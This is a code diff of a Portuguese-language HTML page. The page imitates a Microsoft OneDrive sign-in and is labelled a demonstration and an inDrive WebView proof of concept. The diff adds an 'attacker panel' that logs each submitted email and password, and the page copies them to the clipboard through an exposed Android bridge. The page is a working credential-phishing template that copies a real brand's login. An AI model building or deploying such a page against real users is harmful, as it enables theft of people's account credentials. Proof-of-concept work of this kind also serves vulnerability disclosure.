@@ -4,78 +4,81 @@
     <meta charset="UTF-8">
     <title>OneDrive - Entrar</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-box { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 340px; text-align: center; }
-        h1 { font-size: 24px; margin: 10px 0 20px; color: #333; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        body { font-family: Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; display: flex; gap: 20px; }
+        .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; }
+        .log-box { background: #111; color: #0f0; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); flex: 1; }
+        h1 { font-size: 26px; margin: 0 0 20px; color: #333; }
+        input, button { width: 100%; padding: 14px; margin: 10px 0; border-radius: 6px; font-size: 17px; }
+        input { border: 1px solid #ccc; }
+        button { background: #0078d4; color: white; border: none; cursor: pointer; font-weight: bold; }
         button:hover { background: #0068b7; }
-        .footer { margin-top: 20px; font-size: 13px; color: #666; }
-        .demo { background: #fff3cd; color: #856404; padding: 8px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; }
-        .captured { margin-top: 20px; padding: 20px; background: #ffebee; color: #c62828; border: 2px solid #c62828; border-radius: 8px; text-align: left; font-size: 16px; display: none; }
-        .clipboard-msg { margin-top: 10px; padding: 12px; background: #e8f5e9; color: #2e7d32; border-radius: 4px; font-size: 15px; display: none; }
+        .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 25px; font-size: 15px; }
+        .log-title { color: #0f0; margin-bottom: 15px; font-size: 18px; }
+        .log-entry { background: #1a1a1a; padding: 12px; margin: 8px 0; border-radius: 6px; border-left: 5px solid #f00; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="demo">
-            Esta é uma página de demonstração by Z Kamachi
-        </div>
-        
-        <h1>Entrar</h1>
-        <p>Use sua conta Microsoft para acessar o OneDrive</p>
+    <div class="container">
+        <!-- Formulário falso do OneDrive -->
+        <div class="login-box">
+            <div class="demo">
+                Esta é uma página de demonstração by Z Kamachi
+            </div>
+            <h1>Entrar</h1>
+            <p>Use sua conta Microsoft para acessar o OneDrive</p>
 
-        <form id="phishingForm">
-            <input type="email" id="email" placeholder="E-mail ou telefone" required autocomplete="off">
-            <input type="password" id="password" placeholder="Senha" required autocomplete="off">
-            <button type="submit">Entrar</button>
-        </form>
-
-        <div class="footer">
-            <a href="#">Esqueceu a senha?</a> • <a href="#">Criar conta</a><br>
-            <small>© 2026 Microsoft Corporation</small>
+            <form id="phishingForm">
+                <input type="email" id="email" placeholder="E-mail ou telefone" required autocomplete="off">
+                <input type="password" id="password" placeholder="Senha" required autocomplete="off">
+                <button type="submit">Entrar</button>
+            </form>
         </div>
 
-        <!-- Credenciais capturadas na tela -->
-        <div id="capturedBox" class="captured">
-            <strong>🚨 CREDENCIAIS CAPTURADAS COM SUCESSO!</strong><br><br>
-            <strong>Email:</strong> <span id="capturedEmail"></span><br>
-            <strong>Senha:</strong> <span id="capturedPassword"></span>
-        </div>
-
-        <!-- Mensagem de clipboard -->
-        <div id="clipboardMsg" class="clipboard-msg">
-            ✅ Credenciais copiadas automaticamente para o clipboard via Android Bridge!
+        <!-- Painel do Atacante (Log de credenciais) -->
+        <div class="log-box">
+            <h2 class="log-title">🚨 Credenciais Capturadas (Painel do Atacante)</h2>
+            <div id="logContainer"></div>
         </div>
     </div>
 
     <script>
         const bridge = window.Android;
+        const logContainer = document.getElementById('logContainer');
+
+        function addToLog(email, password) {
+            const time = new Date().toLocaleString('pt-BR');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `
+                <strong>${time}</strong><br>
+                📧 Email: ${email}<br>
+                🔑 Senha: ${password}
+            `;
+            logContainer.prepend(entry);   // adiciona no topo
+        }
 
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            
-            // Formata as credenciais para o clipboard
-            const credenciais = `🔥 Credenciais roubadas via inDrive WebView PoC\nEmail: ${email}\nSenha: ${password}\nHora: ${new Date().toLocaleString('pt-BR')}`;
 
-            // Mostra na tela
-            document.getElementById('capturedEmail').textContent = email;
-            document.getElementById('capturedPassword').textContent = password;
-            document.getElementById('capturedBox').style.display = 'block';
+            // Mostra no log da página
+            addToLog(email, password);
 
-            // Copia via bridge nativo
+            // Copia via bridge (opcional)
             if (bridge && typeof bridge.copyToClipboard === "function") {
                 try {
-                    bridge.copyToClipboard(credenciais);
-                    document.getElementById('clipboardMsg').style.display = 'block';
+                    bridge.copyToClipboard(`Email: ${email} | Senha: ${password}`);
                 } catch(e) {}
             }
 
-            alert(`✅ CREDENCIAIS CAPTURADAS E COPIADAS!\n\nEmail: ${email}\nSenha: ${password}\n\nAgora cole em qualquer lugar para verificar.`);
+            alert("✅ Credenciais capturadas e adicionadas ao log do painel!");
         });
+
+        // Carrega log vazio no início
+        logContainer.innerHTML = '<p style="color:#666; text-align:center;">Aguardando credenciais...</p>';
     </script>
 </body>
 </html>
